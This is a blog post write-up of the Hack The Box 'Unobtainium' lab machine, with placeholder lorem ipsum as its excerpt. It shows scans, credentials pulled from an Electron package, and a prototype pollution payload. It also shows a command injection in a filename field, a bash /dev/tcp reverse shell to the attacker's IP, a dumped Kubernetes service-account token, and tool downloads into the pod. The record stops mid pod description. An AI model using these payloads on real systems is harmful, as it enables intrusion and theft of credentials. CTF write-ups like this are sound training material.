---
layout: single
title: Unobtainium - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-05-25
classes: wide
header:
  teaser: /assets/images/htb-writeup-unobtainium/unobtainium_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-unobtainium/unobtainium_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. [root:/git/htb/unobtainium]# nmap -Pn -n --open -sCV 10.10.10.235                                                                 (master✱)
  PORT      STATE SERVICE       VERSION
  22/tcp    open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey:
  |   3072 e4:bf:68:42:e5:74:4b:06:58:78:bd:ed:1e:6a:df:66 (RSA)
  |   256 bd:88:a1:d9:19:a0:12:35:ca:d3:fa:63:76:48:dc:65 (ECDSA)
  |_  256 cf:c4:19:25:19:fa:6e:2e:b7:a4:aa:7d:c3:f1:3d:9b (ED25519)
  80/tcp    open  http          Apache httpd 2.4.41 ((Ubuntu))
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  |_http-title: Unobtainium
  8443/tcp  open  ssl/https-alt
  | fingerprint-strings:
  |   FourOhFourRequest:
  |     HTTP/1.0 403 Forbidden
  |     Cache-Control: no-cache, private
  |     Content-Type: application/json
  |     X-Content-Type-Options: nosniff
  |     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
  |     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
  |     Date: Tue, 25 May 2021 06:45:36 GMT
  |     Content-Length: 212
  |     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
  |   GenericLines:
  |     HTTP/1.1 400 Bad Request
  |     Content-Type: text/plain; charset=utf-8
  |     Connection: close
  |     Request
  |   GetRequest:
  |     HTTP/1.0 403 Forbidden
  |     Cache-Control: no-cache, private
  |     Content-Type: application/json
  |     X-Content-Type-Options: nosniff
  |     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
  |     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
  |     Date: Tue, 25 May 2021 06:45:35 GMT
  |     Content-Length: 185
  |     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
  |   HTTPOptions:
  |     HTTP/1.0 403 Forbidden
  |     Cache-Control: no-cache, private
  |     Content-Type: application/json
  |     X-Content-Type-Options: nosniff
  |     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
  |     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
  |     Date: Tue, 25 May 2021 06:45:35 GMT
  |     Content-Length: 189
  |_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
  |_http-title: Site doesn't have a title (application/json).
  | ssl-cert: Subject: commonName=minikube/organizationName=system:masters
  | Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.10.235, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
  | Not valid before: 2021-05-24T06:44:22
  |_Not valid after:  2022-05-25T06:44:22
  |_ssl-date: TLS randomness does not represent time
  | tls-alpn:
  |   h2
  |_  http/1.1
  31337/tcp open  http          Node.js Express framework
  | http-methods:
  |_  Potentially risky methods: PUT DELETE
  |_http-title: Site doesn't have a title (application/json; charset=utf-8).
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


[root:/git/htb/unobtainium]# nmap -p- 10.10.10.235                                                                                (master✱)
  PORT      STATE SERVICE
  22/tcp    open  ssh
  80/tcp    open  http
  2379/tcp  open  etcd-client
  2380/tcp  open  etcd-server
  8443/tcp  open  https-alt
  10250/tcp open  unknown
  10256/tcp open  unknown
  31337/tcp open  Elite

[root:/git/htb/unobtainium]# nmap -p 2379,2380,10250,10256 -sCV 10.10.10.235                                                      (master✱)
  PORT      STATE SERVICE          VERSION
  2379/tcp  open  ssl/etcd-client?
  | ssl-cert: Subject: commonName=unobtainium
  | Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
  | Not valid before: 2021-01-17T07:10:30
  |_Not valid after:  2022-01-17T07:10:30
  |_ssl-date: TLS randomness does not represent time
  | tls-alpn:
  |_  h2
  | tls-nextprotoneg:
  |_  h2
  2380/tcp  open  ssl/etcd-server?
  | ssl-cert: Subject: commonName=unobtainium
  | Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
  | Not valid before: 2021-01-17T07:10:30
  |_Not valid after:  2022-01-17T07:10:30
  |_ssl-date: TLS randomness does not represent time
  | tls-alpn:
  |_  h2
  | tls-nextprotoneg:
  |_  h2
  10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
  |_http-title: Site doesn't have a title (text/plain; charset=utf-8).
  | ssl-cert: Subject: commonName=unobtainium@1610865428
  | Subject Alternative Name: DNS:unobtainium
  | Not valid before: 2021-01-17T05:37:08
  |_Not valid after:  2022-01-17T05:37:08
  |_ssl-date: TLS randomness does not represent time
  | tls-alpn:
  |   h2
  |_  http/1.1
  10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
  |_http-title: Site doesn't have a title (text/plain; charset=utf-8).


DIRB:
---- Scanning URL: http://10.10.10.235/ ----
==> DIRECTORY: http://10.10.10.235/assets/
==> DIRECTORY: http://10.10.10.235/downloads/
==> DIRECTORY: http://10.10.10.235/images/
+ http://10.10.10.235/index.html (CODE:200|SIZE:1988)
+ http://10.10.10.235/server-status (CODE:403|SIZE:277)

NIKTO:
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS

FFUF:

-> https://10.10.10.235:10250/FUZZ
attach                  [Status: 401, Size: 12, Words: 1, Lines: 1]
exec                    [Status: 401, Size: 12, Words: 1, Lines: 1]
logs                    [Status: 301, Size: 41, Words: 3, Lines: 3]
metrics                 [Status: 401, Size: 12, Words: 1, Lines: 1]
pods                    [Status: 401, Size: 12, Words: 1, Lines: 1]
run                     [Status: 401, Size: 12, Words: 1, Lines: 1]
stats                   [Status: 301, Size: 42, Words: 3, Lines: 3]


2. Visiting http://10.10.10.235 we are able to download an installation file for the chat program 'Unobtainium'. Installing and
executing the program we find a 'TODO'-list:

 {"ok":true,"content":"1. Create administrator zone.\n2. Update node JS API Server.\n3. Add Login functionality.\n
 4. Complete Get Messages feature.\n5. Complete ToDo feature.\n
 6. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json_api/v1\n7. Improve security\n"}

The first few words indicate that there was probably some kind of authentication before the content was printed.
Open up wireshark, capture all outgoing traffic on tun0 interface and then start 'Unobtainium' software again.
When pressing TODO in the navbar we see a POST request sent to the server - including some credentials.

REQUEST:
  POST /todo HTTP/1.1
  Host: unobtainium.htb:31337
  Connection: keep-alive
  Content-Length: 73
  Accept: application/json, text/javascript, */*; q=0.01
  User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36
  Content-Type: application/json
  Accept-Encoding: gzip, deflate
  Accept-Language: en-US

  {"auth":{"name":"felamos","password":"Winter2021"},"filename":"todo.txt"}

REPLY:
  HTTP/1.1 200 OK
  X-Powered-By: Express
  Content-Type: application/json; charset=utf-8
  Content-Length: 293
  ETag: W/"125-tNs2+nU0UiQGmLreBy4Pj891aVA"
  Date: Tue, 25 May 2021 08:24:09 GMT
  Connection: keep-alive
  Keep-Alive: timeout=5

  {"ok":true,"content":"1. Create administrator zone.\n2. Update node JS API Server.\n3. Add Login functionality.\n4. Complete Get Messages feature.\n5. Complete ToDo feature.\n6. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json_api/v1\n7. Improve security\n"}

After playing around with the application for a few hours I've yet to find anything more of use. I change my approach and
try to see if there are anything useful we can extract from the installation files.

Extract the .deb file so we can browse them.

[root:/git/htb/unobtainium]# dpkg --dry-run -i  unobtainium_1.0.0_amd64.deb                                                       (master✱)
  (Reading database ... 695683 files and directories currently installed.)
  Preparing to unpack unobtainium_1.0.0_amd64.deb ...
[root:/git/htb/unobtainium]# dpkg -e unobtainium_1.0.0_amd64.deb
[root:/git/htb/unobtainium/DEBIAN]# cat control                                                                                   (master✱)
  Package: unobtainium
  Version: 1.0.0
  License: ISC
  Vendor: felamos <felamos@unobtainium.htb>
  Architecture: amd64
  Maintainer: felamos <felamos@unobtainium.htb>
  Installed-Size: 185617
  Depends: libgtk-3-0, libnotify4, libnss3, libxss1, libxtst6, xdg-utils, libatspi2.0-0, libuuid1, libappindicator3-1, libsecret-1-0
  Section: default
  Priority: extra
  Homepage: http://unobtainium.htb
  Description:
    client
[root:.../htb/unobtainium/deb/DEBIAN]# cat postinst                                                                               (master✱)
  ..
  ln -sf '/opt/unobtainium/unobtainium' '/usr/bin/unobtainium'

We find user information that we already know, but also that the program is installed in /opt.
Enumerate /opt/unobtainium and we find '/opt/unobtainium/resources/app.asar'.

Within we can see the credentials that we found earier, but also a set of previously unknown files:

[root:/opt/unobtainium/resources]# cat app.asar
  HD={"files":{"index.js":{"size":503,"offset":"0"},"package.json":{"size":207,"offset":"503"},"src":{"files":{"get.html":{"size":3821,"offset":"710"},"index.html":{"size":3499,"offset":"4531"},"post.html":{"size":3858,"offset":"8030"},"todo.html":{"size":3799,"offset":"11888"},"js":{"files":{"Chart.min.js":{"size":173077,"offset":"15687"},"app.js":{"size":584,"offset":"188764"},"bootstrap.bundle.min.js":{"size":80821,"offset":"189348"},"check.js":{"size":431,"offset":"270169"},"dashboard.js":{"size":953,"offset":"270600"},"feather.min.js":{"size":75779,"offset":"271553"},"get.js":{"size":160,"offset":"347332"},"jquery.min.js":{"size":89476,"offset":"347492"},"todo.js":{"size":350,"offset":"436968"}}},"css":{"files":{"bootstrap.min.css":{"size":153111,"offset":"437318"},"dashboard.css":{"size":1573,"offset":"590429"}}}}}}}const {app, BrowserWindow} = require('electron')
  ..
  $.ajax({
      url: 'http://unobtainium.htb:31337/todo',
      type: 'post',
      dataType:'json',
      contentType:'application/json',
      processData: false,
      data: JSON.stringify({"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : "todo.txt"}),
      success: function(data) {
          $("#output").html(JSON.stringify(data));
      }
  }


3. Analyse the content of the new files, starting with the first - index.js.

  [root:/git/htb/unobtainium]# curl -X POST --data '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : "index.js"}' -H "Content-Type: application/json" http://unobtainium.htb:31337/todo
    {"ok":true,"content":"var root = require(\"google-cloudstorage-commands\");\nconst express = require('express');\nconst { exec } = require(\"child_process\");     \nconst bodyParser = require('body-parser');     \nconst _ = require('lodash');                                                                  \nconst app = express();\nvar fs = require('fs');\n                                                                                              \nconst users = [                                                                               \n  {name: 'felamos', password: 'Winter2021'},\n  {name: 'admin', password: Math.random().toString(32), canDelete: true, canUpload: true},      \n];\n\nlet messages = [];                             \nlet lastId = 1;                                \n                                                                                              \nfunction findUser(auth) {                                                                     \n  return users.find((u) =>                                                                    \n    u.name === auth.name &&                                                                   \n    u.password === auth.password);                                                            \n}                                    \n                                               \napp.use(bodyParser.json());                                                                   \n                                               \napp.get('/', (req, res) => {                   \n  res.send(messages);                                                                         \n});                                                                                           \n                                                                                              \napp.put('/', (req, res) => {   \n  const user = findUser(req.body.auth || {});                                                 \n                                               \n  if (!user) {                                 \n    res.status(403).send({ok: false, error: 'Access denied'});                                \n    return;\n  }\n\n  const message = {\n    icon: '__',\n  };\n\n  _.merge(message, req.body.message, {\n    id: lastId++,\n    timestamp: Date.now(),\n    userName: user.name,\n  });\n\n  messages.push(message);\n  res.send({ok: true});\n});\n\napp.delete('/', (req, res) => {\n  const user = findUser(req.body.auth || {});\n\n  if (!user || !user.canDelete) {\n    res.status(403).send({ok: false, error: 'Access denied'});\n    return;\n  }\n\n  messages = messages.filter((m) => m.id !== req.body.messageId);\n  res.send({ok: true});\n});\napp.post('/upload', (req, res) => {\n  const user = findUser(req.body.auth || {});\n  if (!user || !user.canUpload) {\n    res.status(403).send({ok: false, error: 'Access denied'});\n    return;\n  }\n\n\n  filename = req.body.filename;\n  root.upload(\"./\",filename, true);\n  res.send({ok: true, Uploaded_File: filename});\n});\n\napp.post('/todo', (req, res) => {\n\tconst user = findUser(req.body.auth || {});\n\tif (!user) {\n\t\tres.status(403).send({ok: false, error: 'Access denied'});\n\t\treturn;\n\t}\n\n\tfilename = req.body.filename;\n        testFolder = \"/usr/src/app\";\n        fs.readdirSync(testFolder).forEach(file => {\n                if (file.indexOf(filename) > -1) {\n                        var buffer = fs.readFileSync(filename).toString();\n                        res.send({ok: true, content: buffer});\n                }\n        });\n});\n\napp.listen(3000);\nconsole.log('Listening on port 3000...');\n"}

The code is a mess, beautify it by replacing \n with new lines.
Now we can quickly see two interesting things;
 a) An admin account that has 'canUpload: true', but with a randomized password.
 b) An /upload endpoint

My guess is that we should give our user 'canUpload:true' somehow.
From the software we are able to write messages (PUT), this will be our injection point.

ORIGINAL REQUEST:
  PUT / HTTP/1.1
  Host: unobtainium.htb:31337
  Connection: keep-alive
  Content-Length: 76
  Accept: application/json, text/javascript, */*; q=0.01
  User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36
  Content-Type: application/json
  Accept-Encoding: gzip, deflate
  Accept-Language: en-US

  {"auth":{"name":"felamos","password":"Winter2021"},"message":{"text":"abc"}}

ORIGINAL RESPONSE:
  HTTP/1.1 200 OK
  X-Powered-By: Express
  Content-Type: application/json; charset=utf-8
  Content-Length: 11
  ETag: W/"b-Ai2R8hgEarLmHKwesT1qcY913ys"
  Date: Tue, 25 May 2021 10:03:14 GMT
  Connection: keep-alive
  Keep-Alive: timeout=5

  {"ok":true}

Googling around about Javascript and nodejs injections I came across Prototype Pollution.

QUOTE:
> Let’s take an example, obj[a][b] = value. If an attacker can control a and value, then he can set the value of a to __proto__
> and the property b will be defined for all existing objects of the application with the value value.
> The simplest payload to do the same: {"__proto__": {"admin": 1}}

Meaning in our case we could instead of '{"text":"abc"}' try to send '{"__proto__": {"canUpload":true}}' to enable uploads.

POLLUTED REQUEST:
  PUT / HTTP/1.1
  Host: unobtainium.htb:31337
  Connection: keep-alive
  Content-Length: 96
  Accept: application/json, text/javascript, */*; q=0.01
  User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36
  Content-Type: application/json
  Accept-Encoding: gzip, deflate
  Accept-Language: en-US

  {"auth":{"name":"felamos","password":"Winter2021"},"message":{"__proto__": {"canUpload": true}}}

POLLUTED RESPONSE:
  HTTP/1.1 200 OK
  X-Powered-By: Express
  Content-Type: application/json; charset=utf-8
  Content-Length: 11
  ETag: W/"b-Ai2R8hgEarLmHKwesT1qcY913ys"
  Date: Tue, 25 May 2021 12:52:53 GMT
  Connection: keep-alive
  Keep-Alive: timeout=5

  {"ok":true}


4. We should now be able to POST to http://unobtainium:31337/upload with felamos:Winter2021. We already have the Request form
from when getting todo.txt from /todo, so easiest is probably to reuse that.

UPLOAD REQUEST:
  POST /upload HTTP/1.1
  Host: unobtainium.htb:31337
  Connection: keep-alive
  Content-Length: 73
  Accept: application/json, text/javascript, */*; q=0.01
  User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36
  Content-Type: application/json
  Accept-Encoding: gzip, deflate
  Accept-Language: en-US

  {"auth":{"name":"felamos","password":"Winter2021"},"filename":"test"}

UPLOAD RESPONSE:
  HTTP/1.1 200 OK
  X-Powered-By: Express
  Content-Type: application/json; charset=utf-8
  Content-Length: 34
  ETag: W/"22-fICdI/zK18UFTsKni+1vLp+RWvE"
  Date: Tue, 25 May 2021 13:53:54 GMT
  Connection: keep-alive
  Keep-Alive: timeout=5

  {"ok":true,"Uploaded_File":"test"}

After being stuck here for many hours trying to find how the upload function works, I found a post about bash variable substitution
in JSON. If the function executes we could in theory get command execution directly via the upload function.

Lets test it out with a simple poc first.

cURL POC REQUEST:
  POST /upload HTTP/1.1
  Host: unobtainium.htb:31337
  ..
  {"auth":{"name":"felamos","password":"Winter2021"},"filename":"$(/bin/bash -c 'curl http://10.10.14.6/test.txt')"}

cURL POC RESPONSE:
  HTTP/1.1 200 OK
  ..
  {"ok":true,"Uploaded_File":"$(/bin/bash -c 'curl http://10.10.14.6/test.txt')"}

PYTHON HTTP.SERVER:
[root:/git/htb/unobtainium]# python3 -m http.server 80                                                                            (master✱)
  Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
  10.10.10.235 - - [25/May/2021 15:43:32] "GET /test.txt HTTP/1.1" 200 -

WE GOT CODE EXECUTION!


5. Weaponize the PoC to get a reverse shell.

REVERSE REQUEST:
  POST /upload HTTP/1.1
  Host: unobtainium.htb:31337
  ..
  {"auth":{"name":"felamos","password":"Winter2021"},"filename":"$(/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/4488 0>&1')"}

  [root:/git/htb/unobtainium]# nc -lvnp 4488                                                                                        (master✱)
    listening on [any] 4488 ...
    connect to [10.10.14.6] from (UNKNOWN) [10.10.10.235] 57590
    bash: cannot set terminal process group (1): Inappropriate ioctl for device
    bash: no job control in this shell
    root@webapp-deployment-5d764566f4-lrpt9:/usr/src/app# id
      uid=0(root) gid=0(root) groups=0(root)

It seems like we are in a docker hence the root user. Grab user.txt and take a break.

  root@webapp-deployment-5d764566f4-lrpt9:/usr/src/app# cat /root/user.txt
    f7dabc890c1a2249b31d4ef6a1ab5c4d


QUICK USER SHELL:
  curl -v -X PUT unobtainium.htb:31337 -H "Content-Type: application/json" -d "@user-upload.json"
  curl -v -X POST unobtainium.htb:31337/upload -H "Content-Type: application/json" -d "@user-reverse.json"


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. When enumerating the box manually I came across the file containing the upload function, and within we can clearly see
it why our bash variable substitution worked (hint exec()).

<src/app/node_modules/google-cloudstorage-commands# cat index.js
  const exec = require('child_process').exec
  const path = require('path')
  const P = (() => {
  ..
    function upload(inputDirectory, bucket, force = false) {
        return new Promise((yes, no) => {
            let _path = path.resolve(inputDirectory)
            let _rn = force ? '-r' : '-Rn'
            let _cmd = exec(`gsutil -m cp ${_rn} -a public-read ${_path} ${bucket}`)
            _cmd.on('exit', (code) => {
                yes()
            })
        })
    }

Trying to set up persistence via ssh public key doesn't work as we're in a container or even a kubernetes pod to be exact,
identified when we run 'df'.
We need to find a way to break out of here to the actual box in order to get root.

  root@webapp-deployment-5d764566f4-h5zhw:/#  df
    Filesystem     1K-blocks    Used Available Use% Mounted on
    overlay         12318856 8388464   3788192  69% /
    tmpfs              65536       0     65536   0% /dev
    tmpfs            2015284       0   2015284   0% /sys/fs/cgroup
    /dev/sda1       12318856 8388464   3788192  69% /root
    shm                65536       0     65536   0% /dev/shm
    tmpfs            2015284      12   2015272   1% /run/secrets/kubernetes.io/serviceaccount
    tmpfs            2015284       0   2015284   0% /proc/acpi
    tmpfs            2015284       0   2015284   0% /proc/scsi
    tmpfs            2015284       0   2015284   0% /sys/firmware


root@webapp-deployment-5d764566f4-h5zhw:/# cd /run/secrets/kubernetes.io/serviceaccount/..data
<:/run/secrets/kubernetes.io/serviceaccount/..data# cat token
eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tZ3YycHEiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjQwODNiNTAyLWU0ZGMtNGZiMC1iNzU1LTY0ZmU3ZGVkMzcxNSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.mmkqCtOB3qHPkdybHAJuaLGpQk01UGqecZZO9TfMMeO02PO2CfXoeuRyR1I0BDmyJlxuzuDZdl0k6i0AsQF4DU3Ow_Rm-YZ5cIWDVV3tfuWIA0PvJsmlJqDC4X4OmbOIULLw4i5ckWO_0I35OhlRRLumnaRRrJKFaRnWA1H-zRyAPF3fBGtUuFJecHLNTOaDMyffvBCcblT5z4jjC7V4jKKG05NUNY4UNvvtCiFfevoeTfUzJ4L2dFtkOkHV8k_nC__eJu-CqOvLQlNAWgnJvhNLry_5IVGPxos80R0IC8gOto5bFx0WsSj5av56ff_1UsnDD68IG9uHdinOZC4xvA

An obvious JWT Token.

FIRST PART:
[root:/git/htb/unobtainium]# echo eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ | base64 -d
{"alg":"RS256","kid":"JNvob_VDLBvBVEiZBxpzN0oicDjYmhMT-wB5f-obVS8"}

SECOND PART:
[root:/git/htb/unobtainium]# echo eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tZ3YycHEiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjQwODNiNTAyLWU0ZGMtNGZiMC1iNzU1LTY0ZmU3ZGVkMzcxNSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ | base64 -d
{"iss":"kubernetes/serviceaccount","kubernetes.io/serviceaccount/namespace":"default","kubernetes.io/serviceaccount/secret.name":"default-token-gv2pq","kubernetes.io/serviceaccount/service-account.name":"default","kubernetes.io/serviceaccount/service-account.uid":"4083b502-e4dc-4fb0-b755-64fe7ded3715","sub":"system:serviceaccount:default:default"}

THIRD PART:
mmkqCtOB3qHPkdybHAJuaLGpQk01UGqecZZO9TfMMeO02PO2CfXoeuRyR1I0BDmyJlxuzuDZdl0k6i0AsQF4DU3Ow_Rm-YZ5cIWDVV3tfuWIA0PvJsmlJqDC4X4OmbOIULLw4i5ckWO_0I35OhlRRLumnaRRrJKFaRnWA1H-zRyAPF3fBGtUuFJecHLNTOaDMyffvBCcblT5z4jjC7V4jKKG05NUNY4UNvvtCiFfevoeTfUzJ4L2dFtkOkHV8k_nC__eJu-CqOvLQlNAWgnJvhNLry_5IVGPxos80R0IC8gOto5bFx0WsSj5av56ff_1UsnDD68IG9uHdinOZC4xvA


2. Enumerate the pod further with deepce.sh and using kubectl.


root@webapp-deployment-5d764566f4-h5zhw:/dev/shm# wget http://10.10.14.2:4499/deepce.sh

We are unable to execute scripts in /dev/shm, probably because the 'noexec' option have been specified for that volume, so instead
move the file to /tmp and execute it there.

  root@webapp-deployment-5d764566f4-h5zhw:/tmp# ./deepce.sh
    ..
    ===================================( Enumerating Platform )===================================
    [+] Inside Container ........ Yes
    [+] Container Platform ...... kubentes
    [+] Container tools ......... None
    [+] User .................... root
    [+] Groups .................. root
    ..
    ==================================( Enumerating Container )===================================
    [+] Container ID ............ webapp-deployment-5d764566f4-h5zhw
    [+] Container Name .......... webapp-deployment-5d764566f4-h5zhw
    [+] Container IP ............ 172.17.0.10
    [+] DNS Server(s) ........... 10.96.0.10
    [+] Host IP ................. 172.17.0.1
    [+] Useful tools installed .. Yes
    /usr/bin/curl
    /usr/bin/wget
    /usr/bin/gcc
    /bin/hostname
    /usr/bin/python
    /usr/bin/python2
    /usr/bin/python3
    ..
    ==================================( Enumerating Containers )==================================
    [+] Attempting ping sweep of 172.17.0.10 /24 (ping)
    172.17.0.1 is Up
    172.17.0.3 is Up
    172.17.0.4 is Up
    172.17.0.7 is Up
    172.17.0.10 is Up
    172.17.0.8 is Up
    172.17.0.2 is Up
    172.17.0.9 is Up
    172.17.0.6 is Up
    172.17.0.5 is Up

Not much info to go on, but atleast it confirmed that we're in a kubernetes platform, and gave us some IPs.
Continue the enumeration by downloading/uploading Kubectl.

Download kubectl:
[root:/git/htb/unobtainium]# curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"

Transfer it to the vicitm machine and install it:
  root@webapp-deployment-5d764566f4-h5zhw:/tmp# wget http://10.10.14.2:4499/kubectl
  root@webapp-deployment-5d764566f4-h5zhw:/tmp# install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl
  root@webapp-deployment-5d764566f4-h5zhw:/tmp# kubectl version --client
    Client Version: version.Info{Major:"1", Minor:"22", GitVersion:"v1.22.1", GitCommit:"632ed300f2c34f6d6d15ca4cef3d3c7073412212", GitTreeState:"clean", BuildDate:"2021-08-19T15:45:37Z", GoVersion:"go1.16.7", Compiler:"gc", Platform:"linux/amd64"}

List the namespaces in the environment:
  root@webapp-deployment-5d764566f4-h5zhw:/tmp# ./kubectl get namespaces
    ./kubectl get namespaces
    NAME              STATUS   AGE
    default           Active   221d
    dev               Active   220d
    kube-node-lease   Active   221d
    kube-public       Active   221d
    kube-system       Active   221d

List the pods in the different namespaces (note only dev is accessible):
  <566f4-h5zhw:/tmp# ./kubectl get pods -n dev -o wide
    NAME                                READY   STATUS    RESTARTS   AGE    IP           NODE          NOMINATED NODE   READINESS GATES
    devnode-deployment-cd86fb5c-6ms8d   1/1     Running   30         220d   172.17.0.6   unobtainium   <none>           <none>
    devnode-deployment-cd86fb5c-mvrfz   1/1     Running   31         220d   172.17.0.4   unobtainium   <none>           <none>
    devnode-deployment-cd86fb5c-qlxww   1/1     Running   31         220d   172.17.0.7   unobtainium   <none>           <none>

Gather more information about one of the pods:
  root@webapp-deployment-5d764566f4-h5zhw:/opt# kubectl describe pod devnode-deployment-cd86fb5c-6ms8d -n dev
    Name:         devnode-deployment-cd86fb5c-6ms8d
    Namespace:    dev
    Priority:     0
    Node:         unobtainium/10.10.10.235
    Start Time:   Sun, 17 Jan 2021 18:16:21 +0000
    Labels:       app=devnode
                  pod-template-hash=cd86fb5c
    Annotations:  <none>
    Status:       Running
    IP:           172.17.0.6
    IPs:
      IP:           172.17.0.6
    Controlled By:  ReplicaSet/devnode-deployment-cd86fb5c
    Containers:
      devnode:
        Container ID:   docker://d1036502420a410dabfbc7421bdb212d76c5ec5c469aa9eb3a6aaddcb2614249
        Image:          localhost:5000/node_server
